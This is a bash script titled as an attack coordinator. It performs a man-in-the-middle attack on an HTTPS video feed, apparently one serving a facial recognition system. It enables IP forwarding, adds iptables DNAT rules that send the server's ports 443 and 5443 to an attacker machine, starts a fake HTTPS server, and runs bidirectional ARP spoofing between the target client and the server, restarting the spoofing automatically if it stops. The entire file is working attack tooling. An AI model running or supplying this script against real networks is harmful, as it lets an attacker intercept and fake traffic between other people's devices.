#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' 

log() {
  echo -e "${GREEN}[*]${NC} $1"
}
log_warn() {
  echo -e "${YELLOW}[!]${NC} $1"
}
log_error() {
  echo -e "${RED}[X]${NC} $1"
}
log_info() {
  echo -e "${BLUE}[i]${NC} $1"
}

if [ "$EUID" -ne 0 ]; then
  log_error "Must run as root (sudo ./coordinator.sh)"
  exit 1
fi

if [ "$#" -ne 3 ]; then
  log_error "Usage: sudo $0 <target_client_ip> <original_server_ip> <attacker_ip>"
  exit 1
fi

TARGET_IP="$1"      # Target client IP
HOST_IP="$2"        # Original server IP
LOCAL_IP="$3"       # Attacker IP
IFACE="eth0"        # Change to your network interface
FAKE_SERVER_SCRIPT_PATH="$(dirname "$0")/fake_https.py"
LOG_DIR="/tmp/facial-attack-logs-simple"

log "Attack configuration:"
log_info "Target client IP: $TARGET_IP"
log_info "Original server IP: $HOST_IP"
log_info "Attacker IP: $LOCAL_IP"
log_info "Network interface: $IFACE"
log_info "Fake server script: $FAKE_SERVER_SCRIPT_PATH"
log_info "Log directory: $LOG_DIR"

for cmd in python3 arpspoof iptables; do
  if ! command -v $cmd &> /dev/null; then
    log_error "Command not found: $cmd"
    log_error "Please install required dependencies"
    exit 1
  fi
done

if [ ! -f "$FAKE_SERVER_SCRIPT_PATH" ]; then
  log_error "Fake server script not found: $FAKE_SERVER_SCRIPT_PATH"
  exit 1
fi

log "Checking Python OpenCV..."
if ! python3 -c "import cv2" &> /dev/null; then
  log_error "Cannot import cv2 module, ensure python3-opencv is installed"
  log_error "Try running: sudo apt install python3-opencv"
  exit 1
fi

mkdir -p "$LOG_DIR"
log "Created log directory: $LOG_DIR"

FAKE_SERVER_PID=""
ARP_PID1=""
ARP_PID2=""

cleanup() {
  log "Received interrupt signal, cleaning up..."
  
  if [ -n "$ARP_PID1" ]; then
    log "Stopping ARP spoof process 1 (PID: $ARP_PID1)"
    kill -9 $ARP_PID1 2>/dev/null || true
  fi
  
  if [ -n "$ARP_PID2" ]; then
    log "Stopping ARP spoof process 2 (PID: $ARP_PID2)"
    kill -9 $ARP_PID2 2>/dev/null || true
  fi
  
  if [ -n "$FAKE_SERVER_PID" ]; then
    log "Stopping fake server (PID: $FAKE_SERVER_PID)"
    kill -9 $FAKE_SERVER_PID 2>/dev/null || true
  fi
  
  log "Disabling IP forwarding"
  echo 0 > /proc/sys/net/ipv4/ip_forward
  
  log "Clearing iptables rules"
  iptables -t nat -F
  iptables -t nat -X
  
  log "Cleanup complete. Exiting."
  exit 0
}

trap cleanup SIGINT SIGTERM EXIT

log "Enabling IP forwarding"
echo 1 > /proc/sys/net/ipv4/ip_forward

log "Clearing old NAT rules"
iptables -t nat -F
iptables -t nat -X

log_info "Current NAT table rules:"
iptables -t nat -L -v

log "Starting fake HTTPS server (requires root)"
python3 "$FAKE_SERVER_SCRIPT_PATH" > "$LOG_DIR/fake_server.log" 2>&1 &
FAKE_SERVER_PID=$!
log_info "Fake server started, PID: $FAKE_SERVER_PID"

sleep 2

if ! ps -p $FAKE_SERVER_PID > /dev/null; then
  log_error "Fake server failed to start, check log: $LOG_DIR/fake_server.log"
  cat "$LOG_DIR/fake_server.log"
  cleanup
  exit 1
fi

log "Fake server started successfully, log at: $LOG_DIR/fake_server.log"

log "Setting up HTTPS traffic redirection"
iptables -t nat -A PREROUTING -p tcp -d $HOST_IP --dport 443 -j DNAT --to-destination $LOCAL_IP:443
iptables -t nat -A PREROUTING -p tcp -d $HOST_IP --dport 5443 -j DNAT --to-destination $LOCAL_IP:443
log_info "Redirection set: $HOST_IP:443 -> $LOCAL_IP:443"
log_info "Redirection set: $HOST_IP:5443 -> $LOCAL_IP:443"

log "Starting bidirectional ARP spoofing"
arpspoof -i "$IFACE" -t "$TARGET_IP" "$HOST_IP" > "$LOG_DIR/arpspoof_client.log" 2>&1 &
ARP_PID1=$!
log_info "ARP spoof 1 started: telling client ($TARGET_IP) I am server ($HOST_IP), PID: $ARP_PID1"

arpspoof -i "$IFACE" -t "$HOST_IP" "$TARGET_IP" > "$LOG_DIR/arpspoof_server.log" 2>&1 &
ARP_PID2=$!
log_info "ARP spoof 2 started: telling server ($HOST_IP) I am client ($TARGET_IP), PID: $ARP_PID2"

log_info "NAT table rules (after setup):"
iptables -t nat -L -v

log "Attack coordination complete! Run on client:"
log_info "python3 client/original/https-client-monitor.py https://\$ORIGIN_SERVER_IP:443/video_feed"
log_info "or   python3 client/original/https-client-monitor.py https://\$ORIGIN_SERVER_IP:5443/video_feed"
log "Current log output:"
echo "=================== Fake Server Log ==================="
tail -n 10 "$LOG_DIR/fake_server.log"

log "Keep this window running, press Ctrl+C to end attack..."

while true; do
  if ! ps -p $FAKE_SERVER_PID > /dev/null; then
    log_error "Fake server stopped! Check logs"
    cat "$LOG_DIR/fake_server.log"
    cleanup
    exit 1
  fi
  
  if ! ps -p $ARP_PID1 > /dev/null || ! ps -p $ARP_PID2 > /dev/null; then
    log_error "ARP spoof process stopped! Attempting restart"
    
    if ! ps -p $ARP_PID1 > /dev/null; then
      arpspoof -i "$IFACE" -t "$TARGET_IP" "$HOST_IP" > "$LOG_DIR/arpspoof_client.log" 2>&1 &
      ARP_PID1=$!
      log_info "Restarted ARP spoof 1, new PID: $ARP_PID1"
    fi
    
    if ! ps -p $ARP_PID2 > /dev/null; then
      arpspoof -i "$IFACE" -t "$HOST_IP" "$TARGET_IP" > "$LOG_DIR/arpspoof_server.log" 2>&1 &
      ARP_PID2=$!
      log_info "Restarted ARP spoof 2, new PID: $ARP_PID2"
    fi
  fi
  
  log_info "Latest server logs:"
  tail -n 3 "$LOG_DIR/fake_server.log"
  
  sleep 10
done
